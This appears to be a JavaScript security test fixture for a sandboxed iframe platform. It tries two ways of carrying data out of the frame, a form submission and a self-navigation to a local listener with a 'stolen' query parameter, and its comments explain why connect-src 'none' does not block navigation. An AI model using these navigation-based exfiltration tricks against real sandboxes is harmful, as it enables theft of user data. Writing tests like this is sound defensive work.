/**
 * @disk     breakout
 * @author   diskroom
 * @version  1
 * @players  1-8
 * @about    A test fixture, not an example. It tries to carry what it knows out of the frame in an address rather than in a request, and both roads have to come back closed.
 * @tags     fixture, sandbox, security
 */
// breakout.js — the road out that does not pass through `fetch`.
//
// `connect-src 'none'` closes every request a disk can make. It says nothing
// about the frame replacing its own document: no `sandbox` flag withholds
// that, and no directive in the frame's own policy speaks to it. So
// `location = 'http://elsewhere/?' + secret` is a GET with the payload in the
// query, made by the browser on the disk's behalf.
//
// What closes it is `frame-src` on the platform page, one level up, naming the
// sandbox origin and nothing else. Every navigation of the frame is weighed
// against that directive — the first one and all the rest — so the spellings
// below (`location`, a meta refresh, an anchor with `target="_self"`,
// `window.open(url, '_self')`) are one road with one gate, and the fixture
// tries the first of them last: whichever reaches the gate takes the document
// down with it, blocked or not, and nothing after it in this file would run.
//
// The verdict is therefore read from two places, and `scripts/frame_nav_e2e.mjs`
// reads both: the console line below for the road the browser refuses without
// navigating, and — for the road it refuses by navigating — an HTTP listener
// that counts what actually arrived. A disk chooses where its bytes go, so
// only the far end can say whether any got there.

// The address the harness listens on. Baked in rather than passed: choosing it
// is the whole point of the probe.
const OUTSIDE = 'http://127.0.0.1:38479/breakout';

function record(name, blocked, detail) {
  console.log((blocked ? 'BLOCKED ' : 'PASSED  ') + name + (detail ? ' — ' + detail : ''));
}

// Said out loud before the attempt that ends this document, so the run can be
// told apart from a disk that simply threw.
const LEAVING = 'LEAVING';

/**
 * A form submission is refused by the `sandbox` attribute, before the address
 * is ever weighed: without `allow-forms` there is nothing to submit. Nothing
 * throws and the document stays where it is, so the only evidence is that it
 * is still here a moment later — the same shape as the geolocation probe in
 * `evil.js`, where silence is the refusal.
 */
function submitAForm() {
  const form = document.createElement('form');
  form.method = 'GET';
  form.action = OUTSIDE;
  form.target = '_self';
  const field = document.createElement('input');
  field.name = 'stolen';
  field.value = 'the roster and everything else this disk was told';
  form.appendChild(field);
  document.body.appendChild(form);
  form.submit();
}

function main() {
  const here = location.href;

  submitAForm();

  setTimeout(() => {
    record('form submission to the outside', location.href === here, 'still on ' + location.href);

    // Last, because it ends this document either way: allowed, and the disk
    // is gone with its secret delivered; blocked, and the frame lands on an
    // error page. Neither leaves anybody here to write a verdict, which is why
    // this one carries no BLOCKED or PASSED — claiming either from in here
    // would be claiming to have seen what happens after we stop existing.
    console.log(LEAVING + ' ' + OUTSIDE);
    location.href = OUTSIDE + '?stolen=' + encodeURIComponent(here);
  }, 700);
}

main();
